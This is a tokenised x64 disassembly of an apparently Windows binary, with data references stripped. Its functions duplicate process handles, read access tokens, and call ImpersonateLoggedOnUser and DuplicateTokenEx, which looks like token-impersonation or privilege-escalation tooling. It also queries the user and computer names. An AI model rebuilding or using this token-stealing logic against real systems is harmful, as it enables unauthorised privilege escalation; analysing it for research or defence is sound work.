mov [ rbp + 0x180 ] rax
mov rbx rcx
mov [ rsp + 0x30 ] rcx
xor edi edi
mov [ rsp + 0x20 ] edi
mov [ rcx ] rdi
mov [ rcx + 0x8 ] rdi
mov [ rcx + 0x10 ] rdi
mov [ rsp + 0x20 ] 0x1
lea rax [ sub_14002dd70 ]
mov [ rbp ] rax
mov esi 0x7
mov [ rbp + 0x20 ] rsi
mov [ rbp + 0x8 ] di
mov eax [ r--data ]
mov [ rbp + 0x8 ] eax
movzx eax [ r--data ]
mov [ rbp + 0xc ] ax
mov [ rbp + 0x18 ] 0x3
lea rax [ rbp + 0x8 ]
cmp rsi 0x8
cmovae rax [ rbp + 0x8 ]
mov [ rax + 0x6 ] di
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x40 ] rdi
mov [ rbp + 0x30 ] di
xor r8d r8d
lea edx [ rdi + 0x50 ]
lea rcx [ rbp + 0x30 ]
call sub_1400025a0
lea rcx [ rbp + 0x30 ]
cmp [ rbp + 0x48 ] 0x8
cmovae rcx [ rbp + 0x30 ]
mov r8d 0xa0
lea rdx [ r--data ]
call sub_14003a8c0
mov [ rbp + 0x40 ] 0x50
lea rax [ rbp + 0x30 ]
cmp [ rbp + 0x48 ] 0x8
cmovae rax [ rbp + 0x30 ]
mov [ rax + 0xa0 ] di
lea rdx [ rbp ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_14002de00 ]
mov [ rbp - 0x60 ] r11
mov [ rbp - 0x40 ] rsi
mov [ rbp - 0x58 ] di
mov rcx [ r--data ]
mov [ rbp - 0x58 ] rcx
mov [ rbp - 0x48 ] 0x4
lea rax [ rbp - 0x58 ]
cmp rsi 0x8
cmovae rax rcx
mov [ rax + 0x8 ] di
mov [ rbp - 0x18 ] rsi
mov [ rbp - 0x20 ] rdi
mov [ rbp - 0x30 ] di
xor r8d r8d
lea edx [ rdi + 0xf ]
lea rcx [ rbp - 0x30 ]
call sub_1400025a0
lea r11 [ rbp - 0x30 ]
cmp [ rbp - 0x18 ] 0x8
cmovae r11 [ rbp - 0x30 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov rax [ r--data ]
mov [ r11 + 0x10 ] rax
mov eax [ r--data ]
mov [ r11 + 0x18 ] eax
movzx eax [ r--data ]
mov [ r11 + 0x1c ] ax
mov [ rbp - 0x20 ] 0xf
lea rax [ rbp - 0x30 ]
cmp [ rbp - 0x18 ] 0x8
cmovae rax [ rbp - 0x30 ]
mov [ rax + 0x1e ] di
lea rdx [ rbp - 0x60 ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_14002de10 ]
mov [ rsp + 0x40 ] r11
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x48 ] di
mov rcx [ r--data ]
mov [ rsp + 0x48 ] rcx
mov eax [ r--data ]
mov [ rsp + 0x50 ] eax
movzx eax [ r--data ]
mov [ rsp + 0x54 ] ax
mov [ rsp + 0x58 ] rsi
lea rax [ rsp + 0x48 ]
cmp rsi 0x8
cmovae rax rcx
mov [ rax + 0xe ] di
mov [ rbp - 0x78 ] rsi
mov [ rbp - 0x80 ] rdi
mov [ rsp + 0x70 ] di
xor r8d r8d
lea edx [ rdi + 0x49 ]
lea rcx [ rsp + 0x70 ]
call sub_1400025a0
lea rcx [ rsp + 0x70 ]
cmp [ rbp - 0x78 ] 0x8
cmovae rcx [ rsp + 0x70 ]
mov r8d 0x92
lea rdx [ r--data ]
call sub_14003a8c0
mov [ rbp - 0x80 ] 0x49
lea rax [ rsp + 0x70 ]
cmp [ rbp - 0x78 ] 0x8
cmovae rax [ rsp + 0x70 ]
mov [ rax + 0x92 ] di
lea rdx [ rsp + 0x40 ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_14002de40 ]
mov [ rbp + 0x120 ] r11
mov [ rbp + 0x140 ] rsi
mov [ rbp + 0x138 ] rdi
mov [ rbp + 0x128 ] di
lea r8d [ rdi + 0x4 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x128 ]
call sub_140001ea0
nop
mov [ rbp + 0x168 ] rsi
mov [ rbp + 0x160 ] rdi
mov [ rbp + 0x150 ] di
lea r8d [ rdi + 0x13 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x150 ]
call sub_140001ea0
nop
lea rdx [ rbp + 0x120 ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_14002dcf0 ]
mov [ rbp + 0xc0 ] r11
mov [ rbp + 0xe0 ] rsi
mov [ rbp + 0xd8 ] rdi
mov [ rbp + 0xc8 ] di
mov r8d esi
lea rdx [ r--data ]
lea rcx [ rbp + 0xc8 ]
call sub_140001ea0
nop
mov [ rbp + 0x108 ] rsi
mov [ rbp + 0x100 ] rdi
mov [ rbp + 0xf0 ] di
lea r8d [ rdi + 0x1f ]
lea rdx [ r--data ]
lea rcx [ rbp + 0xf0 ]
call sub_140001ea0
nop
lea rdx [ rbp + 0xc0 ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_14002d630 ]
mov [ rbp + 0x60 ] r11
mov [ rbp + 0x80 ] rsi
mov [ rbp + 0x78 ] rdi
mov [ rbp + 0x68 ] di
lea r8d [ rdi + 0x4 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x68 ]
call sub_140001ea0
nop
mov [ rbp + 0xa8 ] rsi
mov [ rbp + 0xa0 ] rdi
mov [ rbp + 0x90 ] di
lea r8d [ rdi + 0x37 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x90 ]
call sub_140001ea0
nop
lea rdx [ rbp + 0x60 ]
mov rcx rbx
call sub_140018d50
nop
cmp [ rbp + 0xa8 ] 0x8
jb r-xdata
mov [ rbp + 0xa8 ] rsi
mov [ rbp + 0xa0 ] rdi
mov [ rbp + 0x90 ] di
cmp [ rbp + 0x80 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x90 ]
call j_sub_14003ad04
mov [ rbp + 0x80 ] rsi
mov [ rbp + 0x78 ] rdi
mov [ rbp + 0x68 ] di
cmp [ rbp + 0x108 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x68 ]
call j_sub_14003ad04
mov [ rbp + 0x108 ] rsi
mov [ rbp + 0x100 ] rdi
mov [ rbp + 0xf0 ] di
cmp [ rbp + 0xe0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0xf0 ]
call j_sub_14003ad04
mov [ rbp + 0xe0 ] rsi
mov [ rbp + 0xd8 ] rdi
mov [ rbp + 0xc8 ] di
cmp [ rbp + 0x168 ] 0x8
jb r-xdata
mov rcx [ rbp + 0xc8 ]
call j_sub_14003ad04
mov [ rbp + 0x168 ] rsi
mov [ rbp + 0x160 ] rdi
mov [ rbp + 0x150 ] di
cmp [ rbp + 0x140 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x150 ]
call j_sub_14003ad04
mov [ rbp + 0x140 ] rsi
mov [ rbp + 0x138 ] rdi
mov [ rbp + 0x128 ] di
cmp [ rbp - 0x78 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x128 ]
call j_sub_14003ad04
mov [ rbp - 0x78 ] rsi
mov [ rbp - 0x80 ] rdi
mov [ rsp + 0x70 ] di
cmp [ rsp + 0x60 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x70 ]
call j_sub_14003ad04
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x58 ] rdi
mov [ rsp + 0x48 ] di
cmp [ rbp - 0x18 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x48 ]
call j_sub_14003ad04
mov [ rbp - 0x18 ] rsi
mov [ rbp - 0x20 ] rdi
mov [ rbp - 0x30 ] di
cmp [ rbp - 0x40 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x30 ]
call j_sub_14003ad04
mov [ rbp - 0x40 ] rsi
mov [ rbp - 0x48 ] rdi
mov [ rbp - 0x58 ] di
cmp [ rbp + 0x48 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x58 ]
call j_sub_14003ad04
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x40 ] rdi
mov [ rbp + 0x30 ] di
cmp [ rbp + 0x20 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x30 ]
call j_sub_14003ad04
mov rax rbx
mov rcx [ rbp + 0x180 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x290 ]
mov rbx [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
mov rcx [ rbp + 0x8 ]
call j_sub_14003ad04
sub_14002d630
mov rax rsp
push rbp
push r12
push r13
push r14
push r15
lea rbp [ rax - 0x78 ]
sub rsp 0x150
mov [ rsp + 0x70 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x48 ] rax
mov [ rsp + 0x60 ] rcx
lea rdx [ r--data ]
lea r15 [ rw-data ]
mov rcx r15
call sub_14000ac10
mov rcx rax
call sub_140007970
mov rcx rax
call sub_140007970
lea rcx [ r--data ]
call [ GetModuleHandleW@IAT ]
mov rcx rax
lea rdx [ r--data ]
call [ GetProcAddress@IAT ]
mov edi 0x20
mov ecx edi
call sub_14003ac60
mov r14 rax
mov [ rsp + 0x50 ] rax
xor esi esi
test rax rax
je r-xdata
mov r14 rsi
mov [ rsp + 0x50 ] rsi
mov [ rax ] rsi
mov [ rax + 0x8 ] rsi
mov [ rax + 0x10 ] rsi
jmp r-xdata
mov r13 rsi
mov [ rax ] rsi
mov [ rax + 0x8 ] rsi
mov [ rax + 0x10 ] rsi
jmp r-xdata
xor edx edx
mov rcx r14
call sub_14000c0b0
movzx r12d al
mov [ rsp + 0x40 ] al
mov rcx rdi
call sub_14003ac60
mov r13 rax
test rax rax
je r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x8 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
mov rcx r15
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rbp + 0x10 ] 0x8
jb r-xdata
mov rbx [ r13 ]
xor edx edx
mov rcx r13
call sub_14000f930
test al al
je r-xdata
test r13 r13
je r-xdata
mov rcx [ rbp - 0x8 ]
mov r8d [ rbx ]
xor edx edx
lea ecx [ rdx + 0x40 ]
call [ OpenProcess@IAT ]
mov rdi rax
mov [ rsp + 0x58 ] rax
test rax rax
je r-xdata
mov al 0x1
mov rcx [ rbp + 0x48 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x150 ]
mov rbx [ r11 + 0x38 ]
mov rsi [ r11 + 0x40 ]
mov rdi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
mov rcx [ r13 ]
test rcx rcx
je r-xdata
add rbx 0x18
jmp r-xdata
call [ GetCurrentProcess@IAT ]
mov r8 rax
movzx edx [ rbx + 0x6 ]
mov [ rsp + 0x30 ] 0x2
mov [ rsp + 0x28 ] esi
mov [ rsp + 0x20 ] esi
lea r9 [ rsp + 0x48 ]
mov rcx rdi
call [ DuplicateHandle@IAT ]
test eax eax
je r-xdata
mov [ r13 ] rsi
mov [ r13 + 0x8 ] rsi
mov [ r13 + 0x10 ] rsi
mov rcx r13
call j_sub_14003ad04
call j_sub_14003ad04
cmp rbx [ r13 + 0x8 ]
je r-xdata
mov rcx rdi
call [ CloseHandle@IAT ]
mov [ rbp + 0x38 ] 0x7
mov [ rbp + 0x30 ] rsi
mov [ rbp + 0x20 ] si
lea rdx [ rbp + 0x20 ]
mov rcx [ rsp + 0x48 ]
call sub_14000fa40
test al al
je r-xdata
mov rcx [ rsp + 0x48 ]
call [ CloseHandle@IAT ]
nop
cmp [ rbp + 0x38 ] 0x8
jb r-xdata
lea rcx [ rbp + 0x20 ]
cmp [ rbp + 0x38 ] 0x8
cmovae rcx [ rbp + 0x20 ]
lea rdx [ r--data ]
call sub_14003bad0
test eax eax
jne r-xdata
mov rcx [ rbp + 0x20 ]
call j_sub_14003ad04
test r12b r12b
je r-xdata
lea ecx [ rax + 0x58 ]
call sub_14003ac60
mov r12 rax
test rax rax
je r-xdata
mov r12 rsi
mov [ rax + 0x48 ] 0x7
mov [ rax + 0x40 ] rsi
mov [ rax + 0x30 ] si
jmp r-xdata
test r12 r12
je r-xdata
mov [ rbp - 0x18 ] 0x7
mov [ rbp - 0x20 ] rsi
mov [ rbp - 0x30 ] si
mov [ rbp - 0x40 ] 0x7
mov [ rbp - 0x48 ] rsi
mov [ rbp - 0x58 ] si
mov r15 [ rsp + 0x48 ]
xor r14b r14b
mov [ rsp + 0x44 ] esi
lea rax [ rsp + 0x44 ]
mov [ rsp + 0x20 ] rax
xor r9d r9d
xor r8d r8d
lea edx [ r9 + 0x1 ]
mov rcx r15
call [ GetTokenInformation@IAT ]
test eax eax
jne r-xdata
mov r8 r14
mov rdx r12
mov ecx [ rbx ]
call sub_14000d140
test al al
je r-xdata
movzx r12d [ rsp + 0x40 ]
cmp [ r12 + 0x48 ] 0x8
jb r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x8 ]
call sub_14000f390
nop
mov rdx rax
lea rax [ rw-data ]
mov rcx rax
call sub_14000ae70
nop
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
mov [ r12 + 0x48 ] 0x7
mov [ r12 + 0x40 ] rsi
mov [ r12 + 0x30 ] si
mov rcx r12
call j_sub_14003ad04
mov rcx [ r12 + 0x30 ]
call j_sub_14003ad04
cmp [ rbp - 0x40 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x8 ]
call j_sub_14003ad04
nop
mov ecx [ rsp + 0x44 ]
call j_sub_14003ac60
mov rdi rax
lea rax [ rsp + 0x44 ]
mov [ rsp + 0x20 ] rax
mov r9d [ rsp + 0x44 ]
mov r8 rdi
mov edx 0x1
mov rcx r15
call [ GetTokenInformation@IAT ]
test eax eax
je r-xdata
mov [ rbp - 0x40 ] 0x7
mov [ rbp - 0x48 ] rsi
mov [ rbp - 0x58 ] si
cmp [ rbp - 0x18 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x58 ]
call j_sub_14003ad04
mov rcx rdi
call j_sub_14003ad04#2
test r14b r14b
je r-xdata
xor r9d r9d
lea r8 [ rbp - 0x58 ]
lea rdx [ rbp - 0x30 ]
mov rcx [ rdi ]
call sub_14000e700
movzx r14d al
mov r14 [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
mov rcx [ rbp - 0x30 ]
call j_sub_14003ad04
mov r15 [ rsp + 0x60 ]
mov rdx [ r15 ]
cmp rdx [ r15 + 0x8 ]
jne r-xdata
cmp [ rdx + 0x18 ] 0x8
jb r-xdata
lea rdx [ r--data ]
jmp r-xdata
lea rcx [ rbp - 0x30 ]
cmp [ rbp - 0x18 ] 0x8
cmovae rcx [ rbp - 0x30 ]
call sub_14003bad0
test eax eax
jne r-xdata
mov rdx [ rdx ]
lea edx [ rax + 0x5 ]
lea rcx [ rbp - 0x78 ]
call sub_140039e70
mov rcx [ rw-data ]
movsxd rcx [ rcx + 0x4 ]
lea r15 [ rw-data ]
add rcx r15
mov rdx [ rax + 0x8 ]
call [ rax ]
mov r11 [ rw-data ]
movsxd rax [ r11 + 0x4 ]
mov r14d 0x20
mov [ rax + r15 + 0x58 ] r14w
lea edx [ r14 - 0x7 ]
lea rcx [ rsp + 0x78 ]
call sub_140039e70
mov rdi rax
mov edx [ rbx ]
mov rcx r15
call sub_140008400
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov rcx rax
mov rdx rdi
call sub_14000fe10
mov rcx [ rax ]
movsxd rdx [ rcx + 0x4 ]
mov [ rdx + rax + 0x58 ] r14w
mov rcx [ rax ]
movsxd rdx [ rcx + 0x4 ]
add rdx rax
and [ rdx + 0x18 ] 0xfffffe7f
or [ rdx + 0x18 ] 0x40
lea rdx [ r12 + 0x30 ]
mov rcx rax
call sub_14000ae70
mov r14 rax
test rax rax
jne r-xdata
mov rax [ rax ]
movsxd rcx [ rax + 0x4 ]
add rcx r14
mov rcx rsi
jmp r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x8 ]
call sub_14000f390
mov rdi rax
lea rdx [ r--data ]
mov rcx r15
call sub_14000ac10
mov rcx rax
mov rdx rdi
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
jmp r-xdata
mov rcx [ rsp + 0x48 ]
call [ CloseHandle@IAT ]
mov rcx [ rsp + 0x68 ]
mov [ rsp + 0x48 ] rcx
call [ ImpersonateLoggedOnUser@IAT ]
test eax eax
jne r-xdata
and [ rcx + 0x18 ] 0xfffffebf
or [ rcx + 0x18 ] 0x80
mov edx 0x5
lea rcx [ rbp - 0x68 ]
call sub_140039e70
mov rdi rax
lea rdx [ r--data ]
mov rcx r14
call sub_14000ac10
mov rcx rax
mov rdx rdi
call sub_14000fe10
mov rcx [ rax ]
movsxd rdx [ rcx + 0x4 ]
mov edi 0x20
mov [ rdx + rax + 0x58 ] di
movzx edx [ rbx + 0x6 ]
mov rcx rax
call sub_14001c6b0
mov rcx rax
mov edi 0x9
movzx edx di
call sub_14000fe50
mov rcx rax
lea rdx [ rbp - 0x58 ]
call sub_14000ae70
mov rcx rax
lea edx [ rdi + 0x53 ]
call sub_14000fe50
mov rcx rax
lea rdx [ rbp - 0x30 ]
call sub_14000ae70
mov rcx rax
movzx edx di
call sub_14000fe50
lea r11 [ rsp + 0x68 ]
mov [ rsp + 0x28 ] r11
mov [ rsp + 0x20 ] 0x1
lea r9d [ rdi - 0x6 ]
xor r8d r8d
mov edx 0x2000000
mov rcx [ rsp + 0x48 ]
call [ DuplicateTokenEx@IAT ]
test eax eax
setne al
test al al
je r-xdata
cmp [ rbp + 0x10 ] 0x8
jb r-xdata
lea rdx [ r--data ]
mov rcx r15
call sub_14000ac10
mov rcx rax
call sub_140007970
nop
cmp [ rbp - 0x40 ] 0x8
jb r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x8 ]
call sub_14000f390
mov rdi rax
lea rdx [ r--data ]
mov rcx r15
call sub_14000ac10
mov rcx rax
mov rdx rdi
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
jmp r-xdata
mov [ rbp - 0x40 ] 0x7
mov [ rbp - 0x48 ] rsi
mov [ rbp - 0x58 ] si
cmp [ rbp - 0x18 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x58 ]
call j_sub_14003ad04
mov [ rbp - 0x18 ] 0x7
mov [ rbp - 0x20 ] rsi
mov [ rbp - 0x30 ] si
cmp [ rbp + 0x38 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x30 ]
call j_sub_14003ad04
mov rcx [ rbp + 0x20 ]
jmp r-xdata
call j_sub_14003ad04
sub_14002dcf0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov edi 0x29
lea rdx [ r--data ]
lea rcx [ rw-data ]
lea ebx [ rdi - 0x9 ]
call sub_14000ac10
lea rdx [ r--data ]
mov rcx rax
call sub_14000ac10
lea rdx [ r--data ]
mov rcx rax
call sub_140004ed0
movzx edx bx
mov rcx rax
call sub_14000fe50
lea rdx [ r--data ]
mov rcx rax
call sub_140004ed0
movzx edx di
mov rcx rax
call sub_14000fe50
mov rcx rax
call sub_140007970
mov rbx [ rsp + 0x30 ]
mov al 0x1
add rsp 0x20
pop rdi
retn
sub_14002dd70
push rdi
sub rsp 0x60
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x50 ] rax
mov ecx 0xfffffff5
call [ GetStdHandle@IAT ]
lea rdx [ rsp + 0x38 ]
mov rdi rax
xor eax eax
mov rcx rdi
mov [ rsp + 0x30 ] eax
call [ GetConsoleScreenBufferInfo@IAT ]
movsx ecx [ rsp + 0x38 ]
movsx r8d [ rsp + 0x3a ]
imul r8d ecx
mov r9d [ rsp + 0x30 ]
lea rax [ rsp + 0x34 ]
mov edx 0x20
mov rcx rdi
mov [ rsp + 0x20 ] rax
call [ FillConsoleOutputCharacterW@IAT ]
mov edx [ rsp + 0x30 ]
mov rcx rdi
call [ SetConsoleCursorPosition@IAT ]
mov al 0x1
mov rcx [ rsp + 0x50 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0x60
pop rdi
retn
sub_14002de70
mov rax rsp
push rbp
lea rbp [ rax - 0x18 ]
sub rsp 0x110
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp ] rax
mov rbx rcx
mov [ rsp + 0x28 ] rcx
xor edi edi
mov [ rsp + 0x20 ] edi
mov [ rcx ] rdi
mov [ rcx + 0x8 ] rdi
mov [ rcx + 0x10 ] rdi
mov [ rsp + 0x20 ] 0x1
lea rax [ sub_14002e170 ]
mov [ rbp - 0x60 ] rax
mov esi 0x7
mov [ rbp - 0x40 ] rsi
mov [ rbp - 0x58 ] di
mov rcx [ r--data ]
mov [ rbp - 0x58 ] rcx
mov [ rbp - 0x48 ] 0x4
lea rax [ rbp - 0x58 ]
cmp rsi 0x8
cmovae rax rcx
mov [ rax + 0x8 ] di
mov [ rbp - 0x18 ] rsi
mov [ rbp - 0x20 ] rdi
mov [ rbp - 0x30 ] di
xor r8d r8d
lea edx [ rdi + 0x1d ]
lea rcx [ rbp - 0x30 ]
call sub_1400025a0
lea r11 [ rbp - 0x30 ]
cmp [ rbp - 0x18 ] 0x8
cmovae r11 [ rbp - 0x30 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov rax [ r--data ]
mov [ r11 + 0x10 ] rax
mov rax [ r--data ]
mov [ r11 + 0x18 ] rax
mov rax [ r--data ]
mov [ r11 + 0x20 ] rax
mov rax [ r--data ]
mov [ r11 + 0x28 ] rax
mov rax [ r--data ]
mov [ r11 + 0x30 ] rax
movzx eax [ r--data ]
mov [ r11 + 0x38 ] ax
mov [ rbp - 0x20 ] 0x1d
lea rax [ rbp - 0x30 ]
cmp [ rbp - 0x18 ] 0x8
cmovae rax [ rbp - 0x30 ]
mov [ rax + 0x3a ] di
lea rdx [ rbp - 0x60 ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_14002e270 ]
mov [ rsp + 0x40 ] r11
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x58 ] rdi
mov [ rsp + 0x48 ] di
xor r8d r8d
lea edx [ rdi + 0x8 ]
lea rcx [ rsp + 0x48 ]
call sub_1400025a0
lea r11 [ rsp + 0x48 ]
cmp [ rsp + 0x60 ] 0x8
cmovae r11 [ rsp + 0x48 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov [ rsp + 0x58 ] 0x8
lea rax [ rsp + 0x48 ]
cmp [ rsp + 0x60 ] 0x8
cmovae rax [ rsp + 0x48 ]
mov [ rax + 0x10 ] di
mov [ rbp - 0x78 ] rsi
mov [ rbp - 0x80 ] rdi
mov [ rsp + 0x70 ] di
xor r8d r8d
lea edx [ rdi + 0x23 ]
lea rcx [ rsp + 0x70 ]
call sub_1400025a0
lea r11 [ rsp + 0x70 ]
cmp [ rbp - 0x78 ] 0x8
cmovae r11 [ rsp + 0x70 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov rax [ r--data ]
mov [ r11 + 0x10 ] rax
mov rax [ r--data ]
mov [ r11 + 0x18 ] rax
mov rax [ r--data ]
mov [ r11 + 0x20 ] rax
mov rax [ r--data ]
mov [ r11 + 0x28 ] rax
mov rax [ r--data ]
mov [ r11 + 0x30 ] rax
mov rax [ r--data ]
mov [ r11 + 0x38 ] rax
mov eax [ r--data ]
mov [ r11 + 0x40 ] eax
movzx eax [ r--data ]
mov [ r11 + 0x44 ] ax
mov [ rbp - 0x80 ] 0x23
lea rax [ rsp + 0x70 ]
cmp [ rbp - 0x78 ] 0x8
cmovae rax [ rsp + 0x70 ]
mov [ rax + 0x46 ] di
lea rdx [ rsp + 0x40 ]
mov rcx rbx
call sub_140018d50
nop
cmp [ rbp - 0x78 ] 0x8
jb r-xdata
mov [ rbp - 0x78 ] rsi
mov [ rbp - 0x80 ] rdi
mov [ rsp + 0x70 ] di
cmp [ rsp + 0x60 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x70 ]
call j_sub_14003ad04
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x58 ] rdi
mov [ rsp + 0x48 ] di
cmp [ rbp - 0x18 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x48 ]
call j_sub_14003ad04
mov [ rbp - 0x18 ] rsi
mov [ rbp - 0x20 ] rdi
mov [ rbp - 0x30 ] di
cmp [ rbp - 0x40 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x30 ]
call j_sub_14003ad04
mov rax rbx
mov rcx [ rbp ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x110 ]
mov rbx [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
mov rcx [ rbp - 0x58 ]
call j_sub_14003ad04
sub_14002e170
push rbx
sub rsp 0x90
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x80 ] rax
mov [ rsp + 0x48 ] 0x7
xor eax eax
mov [ rsp + 0x40 ] rax
mov [ rsp + 0x30 ] ax
mov [ rsp + 0x20 ] eax
lea r8 [ rsp + 0x20 ]
xor edx edx
lea ecx [ rax + 0x2 ]
call [ GetUserNameExW@IAT ]
test al al
jne r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rsp + 0x58 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
nop
cmp [ rsp + 0x70 ] 0x8
jb r-xdata
lea rdx [ rsp + 0x20 ]
lea rcx [ rsp + 0x30 ]
call sub_14000f600
test al al
je r-xdata
cmp [ rsp + 0x48 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x58 ]
call j_sub_14003ad04
nop
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
lea rdx [ rsp + 0x30 ]
call sub_14000ae70
mov rcx rax
call sub_140007970
jmp r-xdata
mov al 0x1
mov rcx [ rsp + 0x80 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0x90
pop rbx
retn
mov rcx [ rsp + 0x30 ]
call j_sub_14003ad04
sub_14002e270
push rbx
sub rsp 0x90
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x80 ] rax
mov [ rsp + 0x48 ] 0x7
xor eax eax
mov [ rsp + 0x40 ] rax
mov [ rsp + 0x30 ] ax
mov [ rsp + 0x20 ] eax
lea r8 [ rsp + 0x20 ]
xor edx edx
lea ecx [ rax + 0x7 ]
call [ GetComputerNameExW@IAT ]
test eax eax
jne r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rsp + 0x58 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
nop
cmp [ rsp + 0x70 ] 0x8
jb r-xdata
lea rdx [ rsp + 0x20 ]
lea rcx [ rsp + 0x30 ]
call sub_14000f6c0
test al al
je r-xdata
cmp [ rsp + 0x48 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x58 ]
call j_sub_14003ad04
nop
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
lea rdx [ rsp + 0x30 ]
call sub_14000ae70
mov rcx rax
call sub_140007970
jmp r-xdata
mov al 0x1
mov rcx [ rsp + 0x80 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0x90
pop rbx
retn
mov rcx [ rsp + 0x30 ]
call j_sub_14003ad04
sub_14002e370
mov rax rsp
push rbp
lea rbp [ rax - 0x138 ]
sub rsp 0x230
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x120 ] rax
mov rbx rcx
mov [ rsp + 0x30 ] rcx
xor edi edi
mov [ rsp + 0x20 ] edi
mov [ rcx ] rdi
mov [ rcx + 0x8 ] rdi
mov [ rcx + 0x10 ] rdi
mov [ rsp + 0x20 ] 0x1
lea rax [ sub_14002e8b0 ]
mov [ rbp + 0x60 ] rax
mov [ rbp + 0x80 ] 0x7
mov [ rbp + 0x78 ] rdi
mov [ rbp + 0x68 ] di
xor r8d r8d
lea edx [ rdi + 0x8 ]
lea rcx [ rbp + 0x68 ]
call sub_1400025a0
lea r11 [ rbp + 0x68 ]
cmp [ rbp + 0x80 ] 0x8
cmovae r11 [ rbp + 0x68 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov [ rbp + 0x78 ] 0x8
lea rax [ rbp + 0x68 ]
cmp [ rbp + 0x80 ] 0x8
cmovae rax [ rbp + 0x68 ]
mov [ rax + 0x10 ] di
mov [ rbp + 0xa8 ] 0x7
mov [ rbp + 0xa0 ] rdi
mov [ rbp + 0x90 ] di
lea rdx [ rbp + 0x60 ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_14002ec20 ]
mov [ rbp ] r11
mov [ rbp + 0x20 ] 0x7
